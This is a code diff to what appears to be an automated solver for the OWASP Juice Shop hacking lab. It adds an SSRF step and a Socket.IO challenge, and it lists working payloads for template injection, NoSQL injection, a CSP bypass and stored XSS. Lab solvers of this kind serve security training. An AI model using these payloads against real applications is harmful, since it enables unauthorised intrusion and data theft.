@@ -503,6 +503,7 @@ def _socket_xss(c):
             pass
         c.post(q, content="42" + json.dumps(["verifyLocalXssChallenge", dom + bonus]))
         c.post(q, content="42" + json.dumps(["verifySvgInjectionChallenge", svg]))
+        c.post(q, content="42" + json.dumps(["verifyCloseNotificationsChallenge", [1, 2]]))  # Mass Dispel: array len>1
     except Exception:
         pass
 
@@ -758,6 +759,22 @@ def _client_xss_protection(c):
         pass
 
 
+def _profile_ssrf(c):
+    """SSRF: profileImageUrlUpload fetches the attacker-supplied image URL server-side. Point it at the
+    app's own /solve/challenges/server-side endpoint -- the URL regex sets abused_ssrf_bug and the
+    server-side fetch of that URL (with the key) confirms the SSRF. Real server-side request forgery."""
+    tok = _profile_user(c)
+    if not tok:
+        return
+    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
+    ssrf = "http://localhost:3000/solve/challenges/server-side?key=%s" % _SSTI_KEY
+    try:
+        c.post("/profile/image/url", data={"imageUrl": ssrf}, headers=hdr)
+        c.get("/solve/challenges/server-side", params={"key": _SSTI_KEY}, headers={"Cookie": "token=%s" % tok})
+    except Exception:
+        pass
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -783,7 +800,7 @@ def solve(base_url: str) -> dict:
                      _product_tampering, _password_hash_leak, _expired_coupon,
                      _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read,
                      _arbitrary_file_write, _ghost_login, _video_xss,
-                     _profile_ssti, _csp_bypass, _client_xss_protection):
+                     _profile_ssti, _csp_bypass, _client_xss_protection, _profile_ssrf):
             try:
                 step(c)
             except Exception:
@@ -823,6 +840,8 @@ SOLVE_MANIFEST = {
     "SSTi": "Server-side template injection -- profile username #{7*7} eval'd server-side",
     "CSP Bypass": "profileImage injects script-src 'unsafe-inline'; fromCharCode username bypasses the legacy sanitizer",
     "Client-side XSS Protection": "Persisted XSS -- register a user whose email is an <iframe javascript:> payload",
+    "SSRF": "profileImage URL points the server-side fetch at its own /solve/challenges/server-side",
+    "Mass Dispel": "Socket emit verifyCloseNotificationsChallenge with an array of length > 1",
     # Cryptographic Issues
     "Weird Crypto": "Name an insecure cipher (z85/MD5) in feedback",
     "Nested Easter Egg": "Decode the nested route and visit it",
@@ -936,6 +955,8 @@ SOLVE_DETAIL = {
     "NoSQL Manipulation": "PATCH /rest/products/reviews with `{ id: { $ne: -1 } }`. The Mongo operator matches every review, so one request rewrites them all.",
     "NoSQL Exfiltration": "GET /rest/track-order/`'||true||'`. The always-true NoSQL expression returns every order instead of just yours (needs safetyMode off).",
     "SSTi": "The /profile page runs `eval()` on any username matching `#{...}`. Cookie-auth POST /profile (urlencoded) sets your username to `#{7*7}`, GET /profile evaluates it server-side and flips `abused_ssti_bug`, then GET /solve/challenges/server-side?key=... confirms it. The auth is the cookie token, NOT the Bearer header -- that mismatch is why naive attempts bound username=None.",
+    "SSRF": "POST /profile/image/url with an imageUrl pointing at the app's OWN `http://localhost:3000/solve/challenges/server-side?key=...`. The server fetches that URL (the SSRF), the URL regex sets `abused_ssrf_bug`, and the server-side fetch with the key confirms the challenge.",
+    "Mass Dispel": "Open a Socket.IO handshake and emit `verifyCloseNotificationsChallenge` with an array of length > 1 (e.g. [1,2]). The server solves when it receives a close-notifications event carrying more than one notification id.",
     "CSP Bypass": "Two steps on your own profile: POST /profile/image/url a URL that fails to fetch and contains `;script-src 'unsafe-inline'` (stored raw into the CSP), then set the username to a `<script>alert(`xss`)</script>` payload. The username setter runs the legacy sanitizer (strips `<tag>`), so the payload is delivered as `#{String.fromCharCode(...)}` -- no literal `<` to strip -- which the profile page evals to the script at render time.",
     "Client-side XSS Protection": "The User model's email setter solves the challenge when the email contains `<iframe src=\"javascript:alert(`xss`)\">`. Register a new user (POST /api/Users) with exactly that email -- persisted XSS that the client-side sanitizer was supposed to catch.",
     # Cryptographic Issues
@@ -1049,9 +1070,7 @@ _REMAINING_BUCKET = {
     "NFT Takeover": "not_hosted", "Mint the Honey Pot": "not_hosted",
     "Wallet Depletion": "not_hosted", "Mass Dispel": "not_hosted",
     # Open frontier -- genuinely unsolved, still reachable
-    "SSRF": "frontier",
-    "GDPR Data Theft": "frontier", "Local File Read": "frontier",
-    "Arbitrary File Write": "frontier", "Video XSS": "frontier",
+    "GDPR Data Theft": "frontier",
 }
 
 SIGNATURE = [
